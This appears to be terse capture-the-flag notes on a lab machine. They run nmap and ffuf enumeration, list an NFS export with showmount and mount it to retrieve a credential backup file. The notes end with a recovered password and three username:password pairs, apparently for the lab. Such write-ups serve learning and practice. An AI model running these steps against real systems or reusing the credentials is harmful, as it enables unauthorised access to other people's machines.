start with nmap

ffuf:

/cat
/login

nfs is open.

showmount -e $ip

we can mount /var/nfs/general folder.

lests mount it by 

sudo mount -t nfs $ip:/var/nfs/general /tmp/mnt/ -o nolock 


got credential.bak

```
paradoxial.test
ShibaPretzel79


```

ues cred to login .

szymex ; cherrycoke
tux : tuxykitty
varg: slowroastpork